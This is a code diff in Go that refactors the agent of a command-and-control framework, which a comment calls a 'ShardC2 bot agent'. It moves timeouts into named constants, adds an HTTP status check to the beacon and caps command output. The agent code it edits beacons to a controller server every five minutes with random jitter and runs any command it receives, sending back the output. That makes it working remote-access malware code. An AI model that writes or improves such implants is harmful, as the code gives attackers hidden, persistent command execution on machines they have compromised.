@@ -15,6 +15,13 @@ import (
 	"time"
 )
 
+const (
+	BeaconTimeout  = 10 * time.Second
+	CommandTimeout = 30 * time.Second
+	BeaconInterval = 300 * time.Second
+	MaxOutputSize  = 10 * 1024 * 1024 // 10MB
+)
+
 // Agent represents a ShardC2 bot agent
 type Agent struct {
 	ServerURL string
@@ -56,7 +63,7 @@ func (a *Agent) Beacon() error {
 		log.Printf("Failed to marshal beacon data: %v", err)
 		return err
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), BeaconTimeout)
 	defer cancel()
 	req, err := http.NewRequestWithContext(ctx, "POST", a.ServerURL+"/beacon", bytes.NewBuffer(jsonData))
 	if err != nil {
@@ -70,8 +77,12 @@ func (a *Agent) Beacon() error {
 		return err
 	}
 	defer resp.Body.Close()
-	log.Printf("Beacon sent successfully")
-	return nil
+	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+		log.Printf("Beacon sent successfully")
+		return nil
+	} else {
+		return fmt.Errorf("beacon failed with status %d", resp.StatusCode)
+	}
 }
 
 func (a *Agent) StartBeaconing() {
@@ -82,7 +93,7 @@ func (a *Agent) StartBeaconing() {
 			// Continue beaconing despite errors
 		}
 		jitter := time.Duration(rand.Intn(60)) * time.Second // 0-60s jitter
-		time.Sleep(300*time.Second + jitter)                 // beacon every 5min + jitter
+		time.Sleep(BeaconInterval + jitter)                  // beacon every 5min + jitter
 	}
 }
 
@@ -91,10 +102,13 @@ func (a *Agent) ExecuteCommand(cmd string) (string, error) {
 	if len(args) == 0 {
 		return "", fmt.Errorf("empty command")
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), CommandTimeout)
 	defer cancel()
 	command := exec.CommandContext(ctx, args[0], args[1:]...)
 	out, err := command.CombinedOutput()
+	if len(out) > MaxOutputSize {
+		out = out[:MaxOutputSize]
+	}
 	return string(out), err
 }
 
